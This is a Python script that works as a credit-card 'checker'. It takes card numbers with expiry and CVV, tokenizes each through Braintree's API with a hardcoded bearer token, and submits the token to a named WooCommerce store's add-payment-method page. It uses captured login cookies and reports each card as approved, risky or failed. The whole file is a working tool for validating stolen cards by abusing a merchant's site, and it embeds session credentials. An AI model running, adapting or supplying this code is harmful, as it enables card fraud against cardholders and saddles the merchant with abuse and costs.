def capture(string, start, end):
    start_pos, end_pos = string.find(start), string.find(
        end, string.find(start) + len(start)
    )
    return (
        string[start_pos + len(start) : end_pos]
        if start_pos != -1 and end_pos != -1
        else None
    )

def chk(card):
	
	import requests, re, base64, random, string, user_agent, time
	from requests_toolbelt.multipart.encoder import MultipartEncoder
	
	from requests.packages.urllib3.exceptions import InsecureRequestWarning
	
	requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
	
	card = card.strip()
	parts = re.split('[|/:]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]

	if "20" in yy:
		yy = yy.split("20")[1]
	
	
	r = requests.session()
























































	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzQxMjc5NDgsImp0aSI6Ijg0ZjQwMDA3LWYyNDEtNGJlYi04ODYwLWE5MzdiOTU3YzEwMiIsInN1YiI6ImY3Y3N3N2Myanhkc254MmYiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImY3Y3N3N2Myanhkc254MmYiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.ekcSncDoV5CWXup2BWw-d_wE0cmrxDoGPrxIz6fXzghLze9P_tOOluUqIbGhcRLZ_SJcY14gsWLDL85HDV9G7Q',
    'braintree-version': '2018-05-10',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'pragma': 'no-cache',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': 'e481cc17-1e4b-4378-b8db-906b80aa6029',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	tok = response.json()['data']['tokenizeCreditCard']['token']


	cookies = {
    'browser_id': '835f5303-1c91-46f4-87b8-a47492b83d4e',
    'wordpress_logged_in_6054d9db2853e7d53db2e3118d075b34': 'moh555827vbnm%7C1735251034%7C4ElI0CnI2ZXVfTqrnNyzoRgL7XNQzo2L4lm0V87aGUR%7Cb27b1bd367996487ef2ca0db4763d4b7ad97b4303457e3d40dc656b0935d6a0f',
    'wfwaf-authcookie-5bc80232d54eac93bb1f0de1a1a02ffa': '54241%7Cother%7Cread%7C3ef1fdff37919c86e23f9678db8483ab210d32942036cd046cb7e86a7353912e',
    '_ga': 'GA1.1.760568378.1724201436',
    '_fbp': 'fb.1.1724201437375.423154145703648845',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-12-12%2022%3A10%3A12%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.intoxicatedonlife.com%2Fstore%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.intoxicatedonlife.com%2Fstore%2Fmy-account%2Fadd-payment-method%2F',
    'sbjs_first_add': 'fd%3D2024-12-12%2022%3A10%3A12%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.intoxicatedonlife.com%2Fstore%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.intoxicatedonlife.com%2Fstore%2Fmy-account%2Fadd-payment-method%2F',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    'sbjs_session': 'pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.intoxicatedonlife.com%2Fstore%2Fmy-account%2Fadd-payment-method%2F',
    '_ga_1QES5YVWJQ': 'GS1.1.1734041398.9.1.1734041571.0.0.0',
}

	headers = {
    'authority': 'www.intoxicatedonlife.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'browser_id=835f5303-1c91-46f4-87b8-a47492b83d4e; wordpress_logged_in_6054d9db2853e7d53db2e3118d075b34=moh555827vbnm%7C1735251034%7C4ElI0CnI2ZXVfTqrnNyzoRgL7XNQzo2L4lm0V87aGUR%7Cb27b1bd367996487ef2ca0db4763d4b7ad97b4303457e3d40dc656b0935d6a0f; wfwaf-authcookie-5bc80232d54eac93bb1f0de1a1a02ffa=54241%7Cother%7Cread%7C3ef1fdff37919c86e23f9678db8483ab210d32942036cd046cb7e86a7353912e; _ga=GA1.1.760568378.1724201436; _fbp=fb.1.1724201437375.423154145703648845; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-12-12%2022%3A10%3A12%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.intoxicatedonlife.com%2Fstore%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.intoxicatedonlife.com%2Fstore%2Fmy-account%2Fadd-payment-method%2F; sbjs_first_add=fd%3D2024-12-12%2022%3A10%3A12%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.intoxicatedonlife.com%2Fstore%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.intoxicatedonlife.com%2Fstore%2Fmy-account%2Fadd-payment-method%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.intoxicatedonlife.com%2Fstore%2Fmy-account%2Fadd-payment-method%2F; _ga_1QES5YVWJQ=GS1.1.1734041398.9.1.1734041571.0.0.0',
    'origin': 'https://www.intoxicatedonlife.com',
    'pragma': 'no-cache',
    'referer': 'https://www.intoxicatedonlife.com/store/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	data = {
    'payment_method': 'braintree_credit_card',
    'wc-braintree-credit-card-card-type': 'master-card',
    'wc-braintree-credit-card-3d-secure-enabled': '',
    'wc-braintree-credit-card-3d-secure-verified': '',
    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
    'wc_braintree_credit_card_payment_nonce': tok,
    'wc_braintree_device_data': '{"correlation_id":"f5a6e374446f26468483ab0cb0ca74e5"}',
    'wc-braintree-credit-card-tokenize-payment-method': 'true',
    'woocommerce-add-payment-method-nonce': 'd7b0bfa054',
    '_wp_http_referer': '/store/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

	response = requests.post(
    'https://www.intoxicatedonlife.com/store/my-account/add-payment-method/',
    cookies=cookies,
    headers=headers,
    data=data,
)
	text = response.text
	pattern = r'Status code (.*?)\s*</li>'

	
	
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
		    result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
			
	return result
	

